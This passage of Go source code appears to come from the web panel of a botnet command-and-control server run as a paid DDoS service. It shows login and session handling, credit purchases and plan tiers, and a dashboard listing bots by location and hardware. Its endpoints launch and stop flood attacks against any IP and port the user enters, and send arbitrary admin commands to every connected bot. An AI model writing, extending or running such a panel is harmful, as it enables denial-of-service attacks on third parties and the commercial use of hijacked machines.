	http.HandleFunc("/change-plan", addSecurityHeaders(requireAuth(func(w http.ResponseWriter, r *http.Request, user User) {
		if r.Method != "POST" {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}

		plan := r.FormValue("plan")
		if plan != "User" && plan != "Basic" && plan != "Pro" && plan != "Admin" {
			http.Error(w, "Invalid plan", http.StatusBadRequest)
			return
		}

		if plan == "User" || plan == "Basic" {
			users := getUsers()
			for i, u := range users {
				if u.Username == user.Username {
					users[i].Level = plan
					break
				}
			}

			if err := saveUsers(users); err != nil {
				http.Error(w, "Failed to update plan", http.StatusInternalServerError)
				return
			}
			w.Write([]byte("Plan changed successfully"))
		} else {
			http.Error(w, "Upgrading requires payment", http.StatusBadRequest)
		}
	})))

	http.HandleFunc("/add-credits", addSecurityHeaders(requireAuth(func(w http.ResponseWriter, r *http.Request, user User) {
		if r.Method != "POST" {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}

		credits, err := strconv.Atoi(r.FormValue("credits"))
		if err != nil || credits <= 0 {
			http.Error(w, "Invalid credit amount", http.StatusBadRequest)
			return
		}

		txHash := r.FormValue("tx_hash")
		if txHash == "" {
			http.Error(w, "Transaction hash required", http.StatusBadRequest)
			return
		}

		users := getUsers()
		found := false
		for i, u := range users {
			if u.Username == user.Username {
				users[i].Credits += credits
				if users[i].Transactions == nil {
					users[i].Transactions = []Transaction{}
				}
				users[i].Transactions = append(users[i].Transactions, Transaction{
					ID:          uuid.New().String(),
					Amount:      credits,
					Description: fmt.Sprintf("Added %d credits", credits),
					Time:        time.Now(),
					Status:      "Completed",
					TxHash:      txHash,
				})
				found = true
				break
			}
		}

		if !found {
			http.Error(w, "User not found", http.StatusBadRequest)
			return
		}

		if err := saveUsers(users); err != nil {
			http.Error(w, "Failed to save users", http.StatusInternalServerError)
			return
		}

		w.Write([]byte("Credits added successfully"))
	})))

	http.HandleFunc("/dashboard", addSecurityHeaders(requireAuth(func(w http.ResponseWriter, r *http.Request, user User) {
		data := DashboardData{
			User:                 user,
			BotCount:             getBotCount(),
			OngoingAttacks:       getOngoingAttacks(),
			Bots:                 getBots(),
			Users:                getUsers(),
			FlashMessage:         r.URL.Query().Get("flash"),
			MaxAttackDuration:    GetMaxAttackDuration(user.Level),
			MaxConcurrentAttacks: GetMaxConcurrentAttacks(user.Level),
			AvailableMethods:     GetAvailableMethods(user.Level),
			AttackPower:          getAttackPower(getBots()),
			AverageCores:         getAverageCores(getBots()),
			AverageRAM:           getAverageRAM(getBots()),
			TopCountry:           getTopCountry(getBots()),
			TopCity:              getTopCity(getBots()),
			UniqueCountries:      getUniqueCountries(getBots()),
			LastHeartbeat:        getLastHeartbeat(getBots()),
			ActiveBotsCount:      getActiveBotsCount(getBots()),
		}

		botsJSON, err := json.Marshal(data.Bots)
		if err != nil {
			http.Error(w, "Internal server error", http.StatusInternalServerError)
			return
		}
		data.BotsJSON = template.JS(botsJSON)

		err = tmpl.ExecuteTemplate(w, "dashboard.html", data)
		if err != nil {
			http.Error(w, "Internal server error", http.StatusInternalServerError)
			return
		}
	})))

	http.HandleFunc("/attack", addSecurityHeaders(requireAuth(handleAttackForm)))
	http.HandleFunc("/admin-command", addSecurityHeaders(requireAuth(handleAdminCommand)))

	http.HandleFunc("/stop-all-attacks", addSecurityHeaders(requireAuth(func(w http.ResponseWriter, r *http.Request, user User) {
		if r.Method != "POST" {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}

		if len(ongoingAttacks) == 0 {
			http.Error(w, "No active attacks to stop", http.StatusBadRequest)
			return
		}

		for id := range ongoingAttacks {
			delete(ongoingAttacks, id)
		}

		sendToBots("STOP ALL")
		w.Write([]byte("All attacks stopped"))
	})))

	http.HandleFunc("/stop-attack", addSecurityHeaders(requireAuth(func(w http.ResponseWriter, r *http.Request, user User) {
		attackID := r.URL.Query().Get("id")
		if attackID == "" {
			http.Redirect(w, r, "/dashboard?flash=Invalid attack ID", http.StatusSeeOther)
			return
		}

		attack, exists := ongoingAttacks[attackID]
		if !exists {
			http.Redirect(w, r, "/dashboard?flash=Attack not found", http.StatusSeeOther)
			return
		}

		sendToBots(fmt.Sprintf("STOP %s", attack.Target))
		delete(ongoingAttacks, attackID)
		http.Redirect(w, r, "/dashboard?flash=Attack stopped", http.StatusSeeOther)
	})))

	http.HandleFunc("/add-user", addSecurityHeaders(requireAuth(func(w http.ResponseWriter, r *http.Request, user User) {
		if user.Level != "Owner" {
			http.Redirect(w, r, "/dashboard?flash=Permission+denied", http.StatusSeeOther)
			return
		}

		if r.Method != "POST" {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}

		username := r.FormValue("username")
		password := r.FormValue("password")
		level := r.FormValue("level")

		if username == "" || password == "" || level == "" {
			http.Error(w, "Missing user information", http.StatusBadRequest)
			return
		}

		if err := validatePassword(password); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}

		hashedPassword, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
		if err != nil {
			http.Error(w, "Error hashing password", http.StatusInternalServerError)
			return
		}

		users := getUsers()
		for _, u := range users {
			if u.Username == username {
				http.Error(w, "Username already exists", http.StatusBadRequest)
				return
			}
		}

		users = append(users, User{
			ID:       uuid.New().String(),
			Username: username,
			Password: string(hashedPassword),
			Expire:   time.Now().AddDate(1, 0, 0),
			Level:    level,
			Credits:  0,
		})

		if err := saveUsers(users); err != nil {
			http.Error(w, "Error saving user", http.StatusInternalServerError)
			return
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": true,
			"message": "User added successfully",
		})
	})))

	http.HandleFunc("/delete-user", addSecurityHeaders(requireAuth(func(w http.ResponseWriter, r *http.Request, user User) {
		if user.Level != "Owner" {
			http.Redirect(w, r, "/dashboard?flash=Permission denied", http.StatusSeeOther)
			return
		}

		username := r.URL.Query().Get("username")
		if username == "" {
			http.Redirect(w, r, "/dashboard?flash=Invalid username", http.StatusSeeOther)
			return
		}

		if err := deleteUser(username); err != nil {
			http.Redirect(w, r, "/dashboard?flash=Error deleting user: "+err.Error(), http.StatusSeeOther)
			return
		}

		http.Redirect(w, r, "/dashboard?flash=User deleted successfully", http.StatusSeeOther)
	})))

	http.HandleFunc("/logout", addSecurityHeaders(func(w http.ResponseWriter, r *http.Request) {
		session, err := GetSession(r)
		if err == nil {
			session.Options.MaxAge = -1
			session.Save(r, w)
		}

		http.SetCookie(w, &http.Cookie{
			Name:     "access_token",
			Value:    "",
			Path:     "/",
			MaxAge:   -1,
			Secure:   true,
			HttpOnly: true,
			SameSite: http.SameSiteStrictMode,
		})

		http.SetCookie(w, &http.Cookie{
			Name:     "refresh_token",
			Value:    "",
			Path:     "/",
			MaxAge:   -1,
			Secure:   true,
			HttpOnly: true,
			SameSite: http.SameSiteStrictMode,
		})

		http.Redirect(w, r, "/", http.StatusSeeOther)
	}))

	staticHandler := addSecurityHeaders(http.StripPrefix("/static/", http.FileServer(http.Dir("static"))).ServeHTTP)
	http.Handle("/static/", staticHandler)

	log.Fatal(server.ListenAndServeTLS(CERT_FILE, KEY_FILE))
}

func handleSSE(w http.ResponseWriter, r *http.Request, user User) {
	token := r.URL.Query().Get("token")
	if _, err := validateJWT(token); err != nil {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	w.Header().Set("X-Accel-Buffering", "no")

	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "Streaming unsupported", http.StatusInternalServerError)
		return
	}

	clientChan := make(chan Metrics, 10)

	sseClientsMu.Lock()
	sseClients[clientChan] = true
	sseClientsMu.Unlock()

	fmt.Fprintf(w, "data: %s\n\n", toJSON(Metrics{
		BotCount:             getBotCount(),
		ActiveAttacks:        len(ongoingAttacks),
		Attacks:              getOngoingAttacks(),
		Bots:                 getBots(),
		User:                 &user,
		MaxConcurrentAttacks: GetMaxConcurrentAttacks(user.Level),
	}))
	flusher.Flush()

	ctx := r.Context()
	go func() {
		<-ctx.Done()
		sseClientsMu.Lock()
		delete(sseClients, clientChan)
		sseClientsMu.Unlock()
		close(clientChan)
	}()

	ticker := time.NewTicker(15 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			fmt.Fprintf(w, ": heartbeat\n\n")
			flusher.Flush()
		case <-ctx.Done():
			return
		}
	}
}

func handleUserData(w http.ResponseWriter, r *http.Request, user User) {
	if user.Level != "Owner" && user.Level != "Admin" {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"user":    user,
		"bots":    getBots(),
		"attacks": getOngoingAttacks(),
	})
}

func handleAttackForm(w http.ResponseWriter, r *http.Request, user User) {
	if r.Method != "POST" {
		http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
		return
	}

	if err := r.ParseForm(); err != nil {
		http.Redirect(w, r, "/dashboard?flash=Invalid+form+data", http.StatusSeeOther)
		return
	}

	method := r.FormValue("method")
	ip := r.FormValue("ip")
	port := r.FormValue("port")
	duration := r.FormValue("duration")

	if !isValidMethod(method) {
		http.Redirect(w, r, "/dashboard?flash=Invalid+attack+method", http.StatusSeeOther)
		return
	}

	if !isValidIP(ip) && !strictValidateHostname(ip) {
		http.Redirect(w, r, "/dashboard?flash=Invalid+target+IP/hostname", http.StatusSeeOther)
		return
	}

	portInt, err := strconv.Atoi(port)
	if err != nil || !isValidPort(port) {
		http.Redirect(w, r, "/dashboard?flash=Invalid+port+number", http.StatusSeeOther)
		return
	}

	dur, err := strconv.Atoi(duration)
	if err != nil || dur <= 0 || dur > GetMaxAttackDuration(user.Level) {
		http.Redirect(w, r, fmt.Sprintf("/dashboard?flash=Invalid+duration+(1-%d+seconds)", GetMaxAttackDuration(user.Level)), http.StatusSeeOther)
		return
	}

	if len(ongoingAttacks) >= GetMaxConcurrentAttacks(user.Level) {
		http.Redirect(w, r, "/dashboard?flash=Maximum+attack+limit+reached", http.StatusSeeOther)
		return
	}

	if user.Level != "Owner" && user.Level != "Admin" {
		cost := CalculateAttackCost(method, dur, user.Level)
		if user.Credits < cost {
			http.Redirect(w, r, "/dashboard?flash=Insufficient+credits", http.StatusSeeOther)
			return
		}

		users := getUsers()
		for i, u := range users {
			if u.Username == user.Username {
				users[i].Credits -= cost
				break
			}
		}
		if err := saveUsers(users); err != nil {
			http.Redirect(w, r, "/dashboard?flash=Error+updating+credits", http.StatusSeeOther)
			return
		}
	}

	attackID := randomString(8)
	ongoingAttacks[attackID] = Attack{
		Method:   method,
		Target:   ip,
		Port:     port,
		Duration: time.Duration(dur) * time.Second,
		Start:    time.Now(),
	}

	command := fmt.Sprintf("%s %s %d %d", method, ip, portInt, dur)
	if err := sendToBots(command); err != nil {
		delete(ongoingAttacks, attackID)
		http.Redirect(w, r, "/dashboard?flash=Error+sending+attack+"+url.QueryEscape(err.Error()), http.StatusSeeOther)
		return
	}

	updateAttackStats(method, time.Duration(dur)*time.Second)

	go func(id string, dur time.Duration) {
		time.Sleep(dur)
		delete(ongoingAttacks, id)
	}(attackID, time.Duration(dur)*time.Second)

	http.Redirect(w, r, "/dashboard?flash=Attack+launched+successfully", http.StatusSeeOther)
}

func handleAdminCommand(w http.ResponseWriter, r *http.Request, user User) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	if user.Level != "Owner" && user.Level != "Admin" {
		http.Error(w, "Permission denied", http.StatusForbidden)
		return
	}

	command := r.FormValue("command")
	if command == "" {
		http.Error(w, "No command provided", http.StatusBadRequest)
		return
	}

	if err := sendToBots(command); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	http.Redirect(w, r, "/dashboard?flash=Command+sent+successfully", http.StatusSeeOther)
}

func requireAuth(handler func(http.ResponseWriter, *http.Request, User)) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		session, err := GetSession(r)
		if err != nil {
			http.Redirect(w, r, "/?flash=Session+error", http.StatusSeeOther)
			return
		}

		if auth, ok := session.Values["authenticated"].(bool); ok && auth {
			username, _ := session.Values["username"].(string)
			level, _ := session.Values["level"].(string)

			handler(w, r, User{
				Username: username,
				Level:    level,
			})
			return
		}

		accessCookie, err := r.Cookie("access_token")
		if err != nil {
			refreshCookie, err := r.Cookie("refresh_token")
			if err != nil {
				http.Redirect(w, r, "/?flash=Please+login+first", http.StatusSeeOther)
				return
			}

			claims, err := validateJWT(refreshCookie.Value)
			if err != nil {
				http.Redirect(w, r, "/?flash=Session+expired", http.StatusSeeOther)
				return
			}

			users := getUsers()
			var user *User
			for _, u := range users {
				if u.Username == claims.Username {
					user = &u
					break
				}
			}

			if user == nil {
				http.Redirect(w, r, "/?flash=User+not+found", http.StatusSeeOther)
				return
			}

			tokens, err := generateTokenPair(*user)
			if err != nil {
				http.Redirect(w, r, "/?flash=Internal+error", http.StatusSeeOther)
				return
			}

			session, err := GetSession(r)
			if err != nil {
				http.Redirect(w, r, "/?flash=Session+error", http.StatusSeeOther)
				return
			}

			session.Values["authenticated"] = true
			session.Values["username"] = user.Username
			session.Values["level"] = user.Level
			session.Save(r, w)

			http.SetCookie(w, &http.Cookie{
				Name:     "access_token",
				Value:    tokens.AccessToken,
				Path:     "/",
				Secure:   true,
				HttpOnly: true,
				MaxAge:   int(JWT_ACCESS_EXPIRATION.Seconds()),
				SameSite: http.SameSiteStrictMode,
			})

			handler(w, r, *user)
			return
		}

		claims, err := validateJWT(accessCookie.Value)
		if err != nil {
			http.Redirect(w, r, "/?flash=Invalid+session", http.StatusSeeOther)
			return
		}

		users := getUsers()
		var user *User
		for _, u := range users {
			if u.Username == claims.Username {
				user = &u
				break
			}
		}

		if user == nil {
			http.Redirect(w, r, "/?flash=User+not+found", http.StatusSeeOther)
			return
		}

		handler(w, r, *user)
	}
}

func generateTokenPair(user User) (*TokenPair, error) {
	accessExpiration := time.Now().Add(JWT_ACCESS_EXPIRATION)
	accessClaims := &Claims{
		Username: user.Username,
		Level:    user.Level,
		RegisteredClaims: jwt.RegisteredClaims{
			ExpiresAt: jwt.NewNumericDate(accessExpiration),
			Issuer:    JWT_ISSUER,
			ID:        uuid.New().String(),
			NotBefore: jwt.NewNumericDate(time.Now()),
			IssuedAt:  jwt.NewNumericDate(time.Now()),
		},
	}

	accessToken := jwt.NewWithClaims(jwt.SigningMethodHS256, accessClaims)
	accessTokenString, err := accessToken.SignedString([]byte(JWT_SECRET_KEY))
	if err != nil {
		return nil, err
	}

	refreshExpiration := time.Now().Add(JWT_REFRESH_EXPIRATION)
	refreshClaims := &Claims{
		Username: user.Username,
		Level:    user.Level,
		RegisteredClaims: jwt.RegisteredClaims{
			ExpiresAt: jwt.NewNumericDate(refreshExpiration),
			Issuer:    JWT_ISSUER,
			ID:        uuid.New().String(),
			NotBefore: jwt.NewNumericDate(time.Now()),
			IssuedAt:  jwt.NewNumericDate(time.Now()),
		},
	}

	refreshToken := jwt.NewWithClaims(jwt.SigningMethodHS256, refreshClaims)
	refreshTokenString, err := refreshToken.SignedString([]byte(JWT_SECRET_KEY))
	if err != nil {
		return nil, err
	}

	return &TokenPair{
		AccessToken:  accessTokenString,
		RefreshToken: refreshTokenString,
	}, nil
}

func authUser(username, password string) (bool, *User) {
	users := getUsers()
	for _, user := range users {
		if user.Username == username {
			err := bcrypt.CompareHashAndPassword([]byte(user.Password), []byte(password))
			if err == nil {
				if time.Now().After(user.Expire) {
					return false, nil
				}
				return true, &user
			}
		}
	}
	return false, nil
}

func getUsers() []User {
	data, err := os.ReadFile(USERS_FILE)
	if err != nil {
		return []User{}
	}
	var users []User
	if err := json.Unmarshal(data, &users); err != nil {
		return []User{}
	}
	return users
}

func deleteUser(username string) error {
	users := getUsers()
	var updatedUsers []User

	for _, user := range users {
		if user.Username != username {
			updatedUsers = append(updatedUsers, user)
		}
	}

	if len(updatedUsers) == len(users) {
		return fmt.Errorf("user not found")
	}

	return saveUsers(updatedUsers)
}

func saveUsers(users []User) error {
	data, err := json.MarshalIndent(users, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(USERS_FILE, data, 0600)
}

func getOngoingAttacks() []AttackInfo {
	var attacks []AttackInfo

	for id, attack := range ongoingAttacks {
		remaining := time.Until(attack.Start.Add(attack.Duration))
		if remaining <= 0 {
			delete(ongoingAttacks, id)
			continue
		}

		attacks = append(attacks, AttackInfo{
			Method:    attack.Method,
			Target:    attack.Target,
			Port:      attack.Port,
			Duration:  fmt.Sprintf("%.0fs", attack.Duration.Seconds()),
			Remaining: formatDuration(remaining),
			ID:        id,
		})
	}

	return attacks
}

func formatDuration(d time.Duration) string {
	hours := int(d.Hours())
	minutes := int(d.Minutes()) % 60
	seconds := int(d.Seconds()) % 60

	if hours > 0 {
		return fmt.Sprintf("%dh%dm%ds", hours, minutes, seconds)
	} else if minutes > 0 {
		return fmt.Sprintf("%dm%ds", minutes, seconds)
	}
	return fmt.Sprintf("%ds", seconds)
}

func (bm *BotManager) AddBot(bot Bot) {
	bm.mu.Lock()
	defer bm.mu.Unlock()
	bm.bots = append(bm.bots, bot)
	atomic.AddInt64(&bm.count, 1)
}

func (bm *BotManager) GetBots() []Bot {
	bm.mu.RLock()
	defer bm.mu.RUnlock()
	return bm.bots
}

func (bm *BotManager) GetCount() int {
	return int(atomic.LoadInt64(&bm.count))
}

func getBots() []Bot {
	var activeBots []Bot
	for _, b := range bots {
		if b.Conn != nil {
			activeBots = append(activeBots, b)
		}
	}
	return activeBots
}

func getBotCount() int {
	botCountLock.Lock()
	defer botCountLock.Unlock()

	activeCount := 0
	for _, b := range bots {
		if time.Since(b.LastHeartbeat) <= 2*heartbeatInterval {
			activeCount++
		}
	}
	return activeCount
}
